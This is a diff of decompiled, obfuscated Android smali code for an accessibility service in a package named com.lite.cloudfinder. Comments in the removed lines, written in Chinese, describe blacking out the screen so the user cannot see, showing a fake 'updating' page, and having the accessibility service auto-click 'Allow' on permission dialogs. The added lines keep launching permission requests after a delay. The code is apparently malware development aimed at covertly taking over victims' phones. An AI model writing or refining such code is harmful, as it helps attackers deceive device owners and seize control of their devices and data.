@@ -4353,48 +4353,24 @@
 .method public final onServiceConnected()V
     .locals 22
 
-    # === 自动流程：无障碍一连上就 (1) 全屏黑屏遮挡 (2) 拉起权限申请页 ===
-    # 顺序：先黑屏（窗口亮度置 0，用户看不到），再拉权限页；系统权限框是独立窗口，
-    # 仍在最上层，无障碍服务会逐个点「允许」。开关走 SharedPreferences 的 auto_lock_on_acc。
-    :try_start_auto
-    move-object/from16 v2, p0
-    invoke-virtual {v2}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;
-    move-result-object v0
-    const-string v1, "inject_state"
-    const/4 v2, 0x0
-    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
-    move-result-object v0
-    const-string v1, "auto_lock_on_acc"
-    const/4 v2, 0x1
-    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
-    move-result v0
-    if-eqz v0, :cond_auto_done
+    # 无障碍连上后延迟 2 秒再拉权限申请
+    :try_start_perm
+    sget-object v0, Lڟەطڽٲ/ؠ;->ء:Landroid/os/Handler;
+    if-eqz v0, :cond_perm_skip
+    move-object/from16 v4, p0
+    new-instance v1, Lcom/lite/cloudfinder/activity/PermStarter;
+    invoke-direct {v1, v4}, Lcom/lite/cloudfinder/activity/PermStarter;-><init>(Landroid/content/Context;)V
+    const-wide/16 v2, 0x7d0
+    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
+    :cond_perm_skip
+    :try_end_perm
+    .catch Ljava/lang/Exception; {:try_start_perm .. :try_end_perm} :catch_perm
+    goto :goto_perm
 
-    # 假更新页：BlackOverlayActivity + 本地 assets 页面（显示本包图标 + 进度条 + 正在更新中）
-    new-instance v0, Landroid/content/Intent;
-    const-class v1, Lcom/lite/cloudfinder/activity/BlackOverlayActivity;
-    invoke-direct {v0, v2, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
-    const/high16 v1, 0x10000000
-    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
-    const-string v1, "webpage"
-    const-string v3, "file:///android_asset/v4screens/update_boot.html"
-    invoke-virtual {v0, v1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
-    invoke-virtual {v2, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
-
-    new-instance v0, Landroid/content/Intent;
-    const-class v1, Lcom/lite/cloudfinder/activity/PermissionActivity;
-    invoke-direct {v0, v2, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
-    const/high16 v1, 0x10000000
-    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
-    invoke-virtual {v2, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
-
-    :cond_auto_done
-    :try_end_auto
-    .catch Ljava/lang/Exception; {:try_start_auto .. :try_end_auto} :catch_auto
-    goto :goto_auto
-    :catch_auto
+    :catch_perm
     move-exception v0
-    :goto_auto
+    :goto_perm
+
 
     move-object/from16 v1, p0
 
@@ -5053,10 +5029,6 @@
     if-nez v12, :cond_e
 
     :try_start_c
-    invoke-static/range {p0 .. p0}, Lڗًقڔ/؋;->ٽ(Landroid/content/Context;)V
-    :try_end_c
-    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_b
-
     goto :goto_9
 
     :catch_b
